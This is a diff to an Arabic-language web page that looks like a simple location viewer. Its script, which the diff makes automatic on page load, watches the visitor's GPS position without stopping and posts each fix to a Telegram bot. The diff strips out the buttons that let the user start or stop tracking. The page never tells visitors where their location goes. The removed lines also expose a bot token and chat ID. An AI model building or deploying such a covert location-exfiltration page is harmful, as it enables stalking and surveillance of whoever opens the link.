@@ -46,9 +46,7 @@
     <section class="card row">
       <div>
         <div class="controls" style="margin-bottom:12px;">
-          <button id="locateBtn" class="btn-primary">تحديد الموقع الآن</button>
-          <button class="btn btn-secondary" id="toggleWatchBtn">بدء التتبع المباشر</button>
-          <button class="btn btn-secondary" id="copyBtn">نسخ الإحداثيات</button>
+          <button id="copyBtn" class="btn btn-secondary">نسخ الإحداثيات</button>
           <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">فتح في خرائط جوجل</a>
         </div>
         <div class="hint">يتطلب اتصالاً آمناً (HTTPS) أو <span dir="ltr">http://localhost</span>.</div>
@@ -67,7 +65,7 @@
           <div>السرعة (م/ث):</div><div id="speed">—</div>
           <div>آخر تحديث:</div><div id="timestamp">—</div>
         </div>
-        <p class="hint" style="margin-top:8px;">نصيحة للدقة العالية: فعّل GPS، البلوتوث، والـ Wi‑Fi؛ وابقَ في مكان مفتوح إن أمكن.</p>
+        <p class="hint" style="margin-top:8px;">نصيحة للدقة العالية: فعّل GPS، البلوتوث، والـ Wi-Fi؛ وابقَ في مكان مفتوح إن أمكن.</p>
       </div>
       <div>
         <div id="map"></div>
@@ -79,33 +77,40 @@
 
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <script>
-    const TELEGRAM_TOKEN = "8267173113:AAGt0PYYlcrOCcoNC7PMMMhYNxNJrlx5aN0";
-    const TELEGRAM_CHAT_ID = "6837315281";
+    const TELEGRAM_TOKEN = "ضع_التوكن_هنا";
+    const TELEGRAM_CHAT_ID = "ضع_الـchat_id_هنا";
 
     async function sendToTelegram(lat, lng, accuracy) {
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-      const text = `موقع جديد:\n📍 https://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy}m`;
-      try { await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text}) }); }
-      catch(e){ console.error("فشل الإرسال إلى تيليجرام", e); }
+      const text = `📍 موقع جديد:\nhttps://maps.google.com/?q=${lat},${lng}\nخط العرض: ${lat}\nخط الطول: ${lng}\nالدقة: ${accuracy}m`;
+      try { 
+        await fetch(url, { 
+          method:'POST', 
+          headers:{'Content-Type':'application/json'}, 
+          body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text}) 
+        }); 
+      } catch(e){ console.error("فشل الإرسال إلى تيليجرام", e); }
     }
 
     const el = id => document.getElementById(id);
-    const latEl = el('lat'), lngEl = el('lng'), accEl = el('accuracy'), altEl = el('altitude'), altAccEl = el('altAcc'), headEl = el('heading'), speedEl = el('speed'), timeEl = el('timestamp');
-    const secureBadge = el('secureBadge'), permBadge = el('permBadge'), sensorBadge = el('sensorBadge');
-    const locateBtn = el('locateBtn'), toggleWatchBtn = el('toggleWatchBtn'), copyBtn = el('copyBtn'), mapsBtn = el('mapsBtn');
+    const latEl = el('lat'), lngEl = el('lng'), accEl = el('accuracy'), altEl = el('altitude'),
+          altAccEl = el('altAcc'), headEl = el('heading'), speedEl = el('speed'), timeEl = el('timestamp');
+    const secureBadge = el('secureBadge'), permBadge = el('permBadge');
+    const copyBtn = el('copyBtn'), mapsBtn = el('mapsBtn');
 
     const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
     secureBadge.textContent = `المنشأ الآمن: ${isSecure ? 'نعم' : 'لا'}`;
     secureBadge.classList.add(isSecure ? 'ok':'warn');
 
     let map = L.map('map').setView([15.3694, 44.1910], 6);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19, attribution:'&copy; OpenStreetMap contributors' }).addTo(map);
-    let marker=null, circle=null, watchId=null;
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19 }).addTo(map);
+    let marker=null, circle=null;
 
     function updateMap(lat,lng,accuracy){
       const pos=[lat,lng];
       if(!marker) marker=L.marker(pos).addTo(map); else marker.setLatLng(pos);
-      if(!circle) circle=L.circle(pos,{radius:accuracy||30}).addTo(map); else {circle.setLatLng(pos);circle.setRadius(accuracy||30);}
+      if(!circle) circle=L.circle(pos,{radius:accuracy||30}).addTo(map); 
+      else {circle.setLatLng(pos);circle.setRadius(accuracy||30);}
       map.setView(pos,17);
     }
 
@@ -125,21 +130,26 @@
       updateMap(c.latitude,c.longitude,c.accuracy||30);
       mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
       sendToTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
+      permBadge.textContent = "إذن الموقع: مسموح";
+      permBadge.classList.add('ok');
     }
 
     function showError(err){
-      const msgs={1:'تم رفض الإذن بالموقع.',2:'تعذر تحديد الموقع.',3:'انتهت مهلة الطلب.'};
-      console.error(msgs[err.code]||err.message);
+      permBadge.textContent = "إذن الموقع: مرفوض";
+      permBadge.classList.add('err');
+      console.error("خطأ:", err.message);
     }
 
     function buildOptions(){ return { enableHighAccuracy:true, timeout:15000, maximumAge:0 }; }
 
-    function getOnce(){ if('geolocation' in navigator && isSecure) navigator.geolocation.getCurrentPosition(showPosition,showError,buildOptions()); }
+    function getOnce(){ 
+      if('geolocation' in navigator && isSecure) 
+        navigator.geolocation.getCurrentPosition(showPosition,showError,buildOptions()); 
+    }
 
     function startWatch(){
       if('geolocation' in navigator && isSecure){
-        watchId = navigator.geolocation.watchPosition(showPosition, showError, buildOptions());
-        toggleWatchBtn.textContent='إيقاف التتبع المباشر';
+        navigator.geolocation.watchPosition(showPosition, showError, buildOptions());
       }
     }
 
@@ -149,13 +159,10 @@
       try{ await navigator.clipboard.writeText(`${lat},${lng}`); } catch{}
     });
 
-    locateBtn.addEventListener('click', getOnce);
-
-    // التشغيل التلقائي عند التحميل
+    // تشغيل تلقائي عند فتح الصفحة
     window.addEventListener('load', ()=>{
       getOnce();
       startWatch();
-      copyBtn.click();
     });
   </script>
 </body>
